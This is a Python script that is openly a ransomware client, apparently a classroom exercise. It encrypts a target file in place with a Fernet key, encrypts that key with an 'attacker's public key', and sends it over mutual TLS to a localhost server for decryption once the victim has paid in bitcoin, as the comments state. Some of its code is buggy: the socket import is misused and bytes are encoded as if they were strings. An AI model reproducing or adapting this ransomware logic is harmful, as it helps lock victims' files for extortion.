from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import sys
from subprocess import Popen, PIPE
from socket import *
import ssl

def encrypt_file(sym_key_path, file_path):
    # Fernet is an API to generate symmetric keys
    symmetric_key = Fernet.generate_key()
    fernet_instance = Fernet(symmetric_key)

    # Loads the attacker's public key
    with open(sym_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    # Encrypts the symmetric key with the attacker's public key
    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Creates the encrypted key file
    with open("encrypted_symmertric_key.key", "wb") as key_file:
        key_file.write(encrypted_symmetric_key)

    # Replaces the old data with encrypted data
    with open(file_path, "rb") as file:
        file_data = file.read()
        encrypted_data = fernet_instance.encrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(encrypted_data)

# Once the victim has paid in bitcoin they can send
# the encrypted key to the server which will decrypt the key using
# the attackers private key and send the decrypted symmetric key back.
def send_encrypted_key(server_name, e_key_file_path):
    client_key = 'client.key'
    client_cert = 'client.crt'
    server_cert = 'server.crt'
    port = 8080
    hostname = '127.0.0.1'

    context = ssl.SSLContext(ssl.PROTOCOL_TLS, cafile=server_cert)
    context.load_cert_chain(certfile=client_cert, keyfile=client_key)
    context.load_verify_locations(cafile=server_cert)
    context.verify_mode = ssl.CERT_REQUIRED
    context.options |= ssl.OP_SINGLE_ECDH_USE
    context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 | ssl.OP_NO_TLSv1_2

    with socket.create_connection((hostname, port)) as sock:
        with context.wrap_socket(sock, server_side=False,
            server_hostname=hostname) as ssock:

                print(ssock.version())
        
                with open(e_key_file_path, "rb") as file:
                    e_key = file.read()
                    ssock.sendall(str.encode(e_key))

                    d_key = (ssock.recv(4096)).decode()

    return d_key

# Decrypts the file with the decrypted symmetric key
def decrypt_file(file_path, key):
    fernet_instance = Fernet(key)

    with open(file_path, "rb") as file:
        file_data = file.read()
        decrypted_data = fernet_instance.decrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(decrypted_data)

encrypt_file("public_key.key", sys.argv[2])

decrypted_key = send_encrypted_key(sys.argv[1], "encrypted_symmertric_key.key")

decrypt_file(sys.argv[2], decrypted_key)